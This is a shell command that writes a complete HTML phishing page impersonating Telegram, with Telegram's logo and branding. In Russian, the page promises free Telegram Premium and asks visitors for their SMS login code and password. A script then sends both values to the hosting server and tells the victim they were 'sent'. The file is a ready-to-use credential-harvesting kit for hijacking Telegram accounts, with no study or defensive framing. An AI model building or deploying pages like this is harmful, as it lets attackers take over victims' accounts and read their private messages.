cat << 'EOF' > index.html
<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Telegram — Бесплатный Premium</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
    body {
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #eef3f8;
      padding: 20px;
      color: #17212b;
    }
    .card {
      width: 100%;
      max-width: 390px;
      background: #ffffff;
      border-radius: 16px;
      padding: 32px 26px;
      box-shadow: 0 10px 30px rgba(23, 33, 43, 0.08);
      text-align: center;
    }
    .tg-logo {
      width: 68px;
      height: 68px;
      margin: 0 auto 14px;
      border-radius: 50%;
      background: linear-gradient(180deg, #37aee2 0%, #1e96c8 100%);
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 6px 16px rgba(34, 158, 217, 0.3);
    }
    .tg-logo svg {
      width: 34px;
      height: 34px;
      fill: #ffffff;
      margin-left: -2px;
      margin-top: 2px;
    }
    .badge {
      display: inline-block;
      background: #e6f6fd;
      color: #1e96c8;
      font-size: 12px;
      font-weight: 700;
      padding: 4px 10px;
      border-radius: 999px;
      margin-bottom: 10px;
    }
    h1 {
      font-size: 22px;
      font-weight: 700;
      color: #17212b;
      margin-bottom: 6px;
    }
    .sub {
      font-size: 14px;
      color: #708499;
      margin-bottom: 20px;
      line-height: 1.4;
    }
    .field {
      position: relative;
      margin-bottom: 12px;
      text-align: left;
    }
    .label {
      display: block;
      font-size: 12px;
      font-weight: 600;
      color: #708499;
      margin-bottom: 5px;
      padding-left: 2px;
    }
    input, select {
      width: 100%;
      height: 48px;
      padding: 0 44px 0 14px;
      font-size: 15px;
      color: #17212b;
      background: #f4f7fa;
      border: 1px solid #dce4ec;
      border-radius: 10px;
      outline: none;
      transition: border-color 0.15s, background 0.15s;
    }
    select {
      padding-right: 14px;
      cursor: pointer;
    }
    input:focus, select:focus {
      background: #ffffff;
      border-color: #2AABEE;
    }
    input::placeholder {
      color: #8a9bb0;
    }
    .toggle {
      position: absolute;
      right: 10px;
      bottom: 8px;
      background: none;
      border: none;
      color: #708499;
      cursor: pointer;
      font-size: 16px;
      padding: 4px 6px;
    }
    button[type="submit"] {
      width: 100%;
      height: 48px;
      margin-top: 8px;
      background: #2AABEE;
      color: #ffffff;
      font-size: 15px;
      font-weight: 600;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: background 0.15s;
    }
    button[type="submit"]:hover {
      background: #229ED9;
    }
    #msg {
      margin-top: 14px;
      font-size: 14px;
      font-weight: 500;
      color: #229ED9;
      display: none;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="tg-logo" aria-hidden="true">
      <svg viewBox="0 0 24 24">
        <path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l16.01-6.16c.73-.3 1.4.18 1.14 1.29l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"/>
      </svg>
    </div>
    <div class="badge">БЕСПЛАТНО</div>
    <h1>Telegram Premium</h1>
    <p class="sub">Введите SMS-код и пароль для получения бесплатного Premium</p>
    <form id="f">
      <div class="field">
        <label class="label" for="prem">Выбор Premium</label>
        <select id="prem" name="prem">
          <option value="Бесплатно — 1 месяц" selected>Бесплатно — 1 месяц</option>
          <option value="Бесплатно — 6 месяцев">Бесплатно — 6 месяцев</option>
          <option value="Бесплатно — 1 год">Бесплатно — 1 год</option>
          <option value="Без Premium">Без Premium</option>
        </select>
      </div>
      <div class="field">
        <label class="label" for="sms">SMS-код</label>
        <input type="text" id="sms" name="sms" inputmode="numeric" placeholder="Например: 58392" required autocomplete="one-time-code">
      </div>
      <div class="field">
        <label class="label" for="p">Пароль</label>
        <input type="password" id="p" name="p" placeholder="Пароль" required autocomplete="current-password">
        <button type="button" class="toggle" onclick="p.type=p.type==='password'?'text':'password'">👁</button>
      </div>
      <button type="submit">Активировать</button>
      <div id="msg"></div>
    </form>
  </div>
  <script>
    f.addEventListener('submit', async e => {
      e.preventDefault();
      const body = new URLSearchParams({ sms: sms.value, p: p.value, prem: prem.value }).toString();
      await fetch('/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body
      });
      msg.style.display = 'block';
      msg.textContent = 'Отправлено';
    });
  </script>
</body>
</html>
EOF
